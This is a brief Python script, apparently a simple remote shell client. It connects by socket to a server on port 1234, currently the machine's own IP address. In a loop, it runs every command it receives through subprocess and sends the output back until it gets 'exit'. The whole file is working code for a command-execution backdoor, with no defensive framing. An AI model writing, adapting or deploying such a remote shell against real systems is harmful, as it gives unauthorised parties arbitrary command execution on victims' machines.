import socket
import subprocess

#Create socket
s=socket.socket()

#Grab client IP address
CLIENT_HOSTNAME = socket.gethostname()
CLIENT_IP=socket.gethostbyname(CLIENT_HOSTNAME)

PORT=1234
#IP address for the server
s.connect((CLIENT_IP, PORT))

#Recieving Loop
while True:

    command2Execute = s.recv(1024).decode()
    #end connection
    if command2Execute.lower() == "exit":
        break
    commandResults = subprocess.getoutput(command2Execute)
    s.send(commandResults.encode())
#End connection to server
s.close()